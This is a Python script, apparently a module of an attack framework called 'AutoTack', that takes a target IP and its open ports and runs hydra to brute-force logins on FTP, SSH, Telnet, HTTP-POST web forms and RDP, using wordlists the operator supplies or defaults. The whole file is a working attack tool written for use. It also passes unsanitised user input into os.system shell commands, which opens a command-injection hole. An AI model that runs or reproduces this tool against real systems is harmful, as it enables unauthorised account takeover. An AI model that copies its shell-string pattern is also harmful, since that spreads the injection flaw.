## AutoTack Bruteforce Module powered  by hydra

import os


print('\nBruteForce\n')



## Universal Pipe in of info/variables
importPORT  = open("Modules/attack/autotack/exploits/targets_tmp", "r" )
attackList = (importPORT.read())



importPORT.close
 # - - - - #
importIP  = open("Modules/attack/autotack/exploits/iptargets_tmp", "r" )
targetIP = (importIP.read())



importIP.close
## -- pipe over

print('\nYour target is: ' + targetIP + '\n')


print('Enter Wordlist locations, or hit enter/leave blank for default')
print('For reference, Your current Directory:')
os.system('pwd')

print('\nUsername List:\n')
userlist = input().lower()
print('\nPassword List:\n')
passlist = input().lower()

if userlist == "":
    userlist = 'Modules/attack/systemaccess/protocolcracker/simpleuser.txt'
if passlist == "":
    passlist = 'Modules/attack/systemaccess/protocolcracker/simplepass.txt'


if '21' in attackList:
    print('----------')
    print('\nStarting FTP bruteforce\n')
    os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ftp://' + targetIP  )

if '22' in attackList:
    print('----------')
    print('\nStarting SSH bruteforce\n')
    os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ssh://' + targetIP  )

                #os.system('hydra -I -L Modules/attack/systemaccess/protocolcracker/simpleuser.txt -P Modules/attack/systemaccess/protocolcracker/simplepass.txt ssh://' + targetIP  )

if '23' in attackList:
    print('----------')
    print('\nStarting TELNET bruteforce\n')
    os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' telnet://' + targetIP  )
    ## later on add more options, like level of depth of scan, for now this will use basic login creds
    print('--')


if '80' in attackList:
    print('There are many possible attacks for webservers; please make a selection for which attack below')
    print ('''
        a) HTTP-POST - Webapp login forms
        b) HTTP-?
        C) HTTP-?
                            ''')
    http_attack_type = input().lower()

        ## -- HTTP POST -- ##
    if http_attack_type == 'a':
        print('----------')
        print('For a succesful HTTP-POST attack, hydra must know the location of the login form, please enter the URL of the form below - ex if  target is at 192.168.0.1/login.php, enter "/login.php"')
        loginform = input().lower()

        print('\nStarting HTTP-POST bruteforce\n')
        os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' http-post://'  + targetIP + loginform )
        print('--')

if '3389' in attackList:
    print('--')
    print('Starting RDP bruteforce')
    print('\n')
    os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' rdp://' + targetIP  )
    ## later on add more options, like level of depth of scan, for now this will use basic login creds
    print('----------')


## Final stuff
print('----------')
print('\nAttack completed, scroll through stdout to see if successful! Text should be green!\n')
print('\nType reload to head back to the main menu\n')
